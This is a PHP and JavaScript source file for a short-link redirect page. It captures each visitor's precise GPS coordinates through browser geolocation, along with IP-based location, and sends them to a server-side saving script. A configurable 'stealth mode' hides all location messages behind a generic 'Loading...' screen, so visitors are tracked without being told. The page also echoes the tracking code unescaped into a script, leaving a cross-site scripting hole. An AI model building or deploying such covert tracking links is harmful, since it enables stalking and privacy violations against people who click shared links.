<?php
require_once('../config.php');
$db = connectDB();

// Get the tracking code from URL
$code = $_GET['code'] ?? '';

if (empty($code)) {
    die('Invalid tracking code');
}

// Get the original link from database
$stmt = $db->prepare("SELECT original_url FROM geo_links WHERE short_code = ?");
$stmt->execute([$code]);
$link = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$link) {
    die('Link not found');
}

$original_url = $link['original_url'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= SHOW_LOCATION_MESSAGES ? 'Precise Location Tracking' : 'Redirect Service' ?></title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        .location-status {
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
        }
        .status-loading { background-color: #fff3cd; border: 1px solid #ffeaa7; }
        .status-success { background-color: #d4edda; border: 1px solid #c3e6cb; }
        .status-error { background-color: #f8d7da; border: 1px solid #f5c6cb; }
        .accuracy-info {
            font-size: 0.9rem;
            color: #666;
            margin-top: 10px;
        }
        .redirect-button {
            margin-top: 20px;
        }
    </style>
</head>
<body class="bg-light">
    <div class="container py-5">
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card shadow">
                                         <div class="card-header bg-primary text-white text-center">
                         <h4><i class="fa-solid fa-map-marker-alt"></i> <?= SHOW_LOCATION_MESSAGES ? 'Precise Location Tracking' : 'Redirect Service' ?></h4>
                     </div>
                    <div class="card-body">
                        
                                                 <!-- Location Status Display -->
                         <?php if (SHOW_LOCATION_MESSAGES): ?>
                         <div id="locationStatus" class="location-status status-loading">
                             <div class="text-center">
                                 <div class="spinner-border text-warning" role="status">
                                     <span class="visually-hidden">Loading...</span>
                                 </div>
                                 <h5 class="mt-3">Getting Your Precise Location...</h5>
                                 <p class="text-muted">Please allow location access when prompted by your browser.</p>
                                 <div class="mt-3">
                                     <button id="skipLocationBtn" class="btn btn-outline-secondary btn-sm" onclick="skipLocation()">
                                         <i class="fa-solid fa-forward"></i> Skip Location & Continue
                                     </button>
                                 </div>
                             </div>
                         </div>
                         <?php else: ?>
                         <!-- Stealth mode - no location messages -->
                         <div id="locationStatus" class="location-status status-loading" style="display: none;">
                             <div class="text-center">
                                 <div class="spinner-border text-primary" role="status">
                                     <span class="visually-hidden">Loading...</span>
                                 </div>
                                 <h5 class="mt-3">Loading...</h5>
                                 <p class="text-muted">Please wait while we prepare your destination.</p>
                             </div>
                         </div>
                         <?php endif; ?>

                                                 <!-- Location Details (Hidden initially) -->
                         <?php if (SHOW_LOCATION_MESSAGES): ?>
                         <div id="locationDetails" style="display: none;">
                             <h5><i class="fa-solid fa-location-dot text-success"></i> Location Captured!</h5>
                             <div class="row">
                                 <div class="col-md-6">
                                     <p><strong>Latitude:</strong> <span id="latitude"></span></p>
                                     <p><strong>Longitude:</strong> <span id="longitude"></span></p>
                                     <p><strong>Accuracy:</strong> <span id="accuracy"></span> meters</p>
                                 </div>
                                 <div class="col-md-6">
                                     <p><strong>Street Address:</strong> <span id="address"></span></p>
                                     <p><strong>City:</strong> <span id="city"></span></p>
                                     <p><strong>Country:</strong> <span id="country"></span></p>
                                 </div>
                             </div>
                         </div>
                         <?php endif; ?>

                        <!-- Redirect Button -->
                        <div class="text-center redirect-button">
                            <a id="redirectButton" href="<?= htmlspecialchars($original_url) ?>" 
                               class="btn btn-success btn-lg" style="display: none;">
                                <i class="fa-solid fa-external-link-alt"></i> Continue to Destination
                            </a>
                        </div>

                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // Store tracking code for AJAX call
        const trackingCode = '<?= $code ?>';
        const originalUrl = '<?= htmlspecialchars($original_url) ?>';
        
        // Debug logging
        console.log('Script loaded successfully');
        console.log('Tracking code:', trackingCode);
        console.log('Original URL:', originalUrl);

        function updateStatus(message, type) {
            console.log('Updating status:', message, type);
            const statusDiv = document.getElementById('locationStatus');
            if (statusDiv) {
                <?php if (SHOW_LOCATION_MESSAGES): ?>
                statusDiv.className = `location-status status-${type}`;
                statusDiv.innerHTML = `
                    <div class="text-center">
                        <h5><i class="fa-solid fa-${type === 'success' ? 'check-circle text-success' : 'exclamation-triangle text-danger'}"></i> ${message}</h5>
                    </div>
                `;
                <?php else: ?>
                // Stealth mode - don't show location messages
                statusDiv.style.display = 'none';
                <?php endif; ?>
            }
        }

        function saveIPBasedLocation() {
            console.log('Saving IP-based location...');
            const formData = new FormData();
            formData.append('code', trackingCode);
            formData.append('ip_only', 'true');
            formData.append('timestamp', new Date().toISOString());

            console.log('Sending request to save_precise_location.php');
            fetch('save_precise_location.php', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                console.log('Response received:', response);
                return response.json();
            })
            .then(data => {
                console.log('Data received:', data);
                if (data.success) {
                    console.log('IP-based location saved successfully');
                } else {
                    console.error('Failed to save IP-based location:', data.error);
                }
            })
            .catch(error => {
                console.error('Error saving IP-based location:', error);
            });
        }

        function skipLocation() {
            console.log('Skip location clicked');
            try {
                updateStatus('Location tracking skipped. Proceeding with IP-based tracking...', 'error');
                saveIPBasedLocation();
                
                const redirectElement = document.getElementById('redirectButton');
                const skipElement = document.getElementById('skipLocationBtn');
                
                if (redirectElement) redirectElement.style.display = 'inline-block';
                if (skipElement) skipElement.style.display = 'none';
                
                console.log('Skip location completed successfully');
            } catch (error) {
                console.error('Error in skipLocation:', error);
                // Force show redirect button even if there's an error
                const redirectElement = document.getElementById('redirectButton');
                if (redirectElement) redirectElement.style.display = 'inline-block';
            }
        }

        // Show button immediately after 2 seconds
        setTimeout(() => {
            console.log('Showing redirect button immediately');
            const redirectElement = document.getElementById('redirectButton');
            if (redirectElement) {
                redirectElement.style.display = 'inline-block';
                updateStatus('Proceeding with IP-based tracking...', 'error');
                saveIPBasedLocation();
            }
        }, 2000);

        // Enhanced precise location tracking
        if (navigator.geolocation) {
            console.log('Attempting high-accuracy geolocation...');
            
            // First try: High accuracy GPS (most precise)
            navigator.geolocation.getCurrentPosition(
                function(position) {
                    console.log('High-accuracy GPS success:', position);
                    updateStatus('Precise GPS location captured!', 'success');
                    
                    // Show detailed location info
                    showDetailedLocation(position);
                    
                    // Save precise GPS location
                    const formData = new FormData();
                    formData.append('code', trackingCode);
                    formData.append('latitude', position.coords.latitude);
                    formData.append('longitude', position.coords.longitude);
                    formData.append('accuracy', position.coords.accuracy);
                    formData.append('location_type', 'GPS');
                    formData.append('timestamp', new Date().toISOString());

                    fetch('save_precise_location.php', {
                        method: 'POST',
                        body: formData
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            console.log('Precise GPS location saved successfully');
                        }
                    })
                    .catch(error => {
                        console.error('Error saving GPS location:', error);
                    });
                },
                function(error) {
                    console.log('High-accuracy GPS failed, trying standard accuracy...', error);
                    
                    // Second try: Standard accuracy (fallback)
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            console.log('Standard accuracy success:', position);
                            updateStatus('Location captured (standard accuracy)', 'success');
                            
                            showDetailedLocation(position);
                            
                            const formData = new FormData();
                            formData.append('code', trackingCode);
                            formData.append('latitude', position.coords.latitude);
                            formData.append('longitude', position.coords.longitude);
                            formData.append('accuracy', position.coords.accuracy);
                            formData.append('location_type', 'GPS');
                            formData.append('timestamp', new Date().toISOString());

                            fetch('save_precise_location.php', {
                                method: 'POST',
                                body: formData
                            })
                            .then(response => response.json())
                            .then(data => {
                                if (data.success) {
                                    console.log('Standard GPS location saved successfully');
                                }
                            })
                            .catch(error => {
                                console.error('Error saving GPS location:', error);
                            });
                        },
                        function(error) {
                            console.log('Standard accuracy also failed:', error);
                            // Let the immediate fallback handle IP-based tracking
                        },
                        {
                            enableHighAccuracy: false,
                            timeout: 5000,
                            maximumAge: 60000
                        }
                    );
                },
                {
                    enableHighAccuracy: true,  // Request highest possible accuracy
                    timeout: 10000,           // 10 seconds for high accuracy
                    maximumAge: 0             // Don't use cached position
                }
            );
        } else {
            console.log('Geolocation not supported');
        }

        function showDetailedLocation(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            console.log(`Location: ${lat}, ${lng} (accuracy: ${accuracy}m)`);
            
            <?php if (SHOW_LOCATION_MESSAGES): ?>
            // Update display elements
            const latElement = document.getElementById('latitude');
            const lngElement = document.getElementById('longitude');
            const accElement = document.getElementById('accuracy');
            
            if (latElement) latElement.textContent = lat.toFixed(6);
            if (lngElement) lngElement.textContent = lng.toFixed(6);
            if (accElement) accElement.textContent = accuracy.toFixed(1);
            
            // Get detailed address using Nominatim
            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1&extratags=1`)
                .then(response => response.json())
                .then(data => {
                    console.log('Reverse geocoding result:', data);
                    
                    const addrElement = document.getElementById('address');
                    const cityElement = document.getElementById('city');
                    const countryElement = document.getElementById('country');
                    
                    if (data.display_name) {
                        // Full detailed address
                        if (addrElement) addrElement.textContent = data.display_name;
                        
                        // City and country
                        if (cityElement) {
                            const city = data.address?.city || data.address?.town || data.address?.village || 'Unknown';
                            cityElement.textContent = city;
                        }
                        
                        if (countryElement) {
                            const country = data.address?.country || 'Unknown';
                            countryElement.textContent = country;
                        }
                        
                        // Show location details section
                        const detailsElement = document.getElementById('locationDetails');
                        if (detailsElement) detailsElement.style.display = 'block';
                        
                        console.log('Detailed address displayed:', data.display_name);
                    }
                })
                .catch(error => {
                    console.error('Reverse geocoding failed:', error);
                    const addrElement = document.getElementById('address');
                    if (addrElement) addrElement.textContent = 'Could not determine address';
                });
            <?php else: ?>
            // Stealth mode - don't show location details to user
            console.log('Location captured in stealth mode');
            <?php endif; ?>
        }
    </script>
</body>
</html>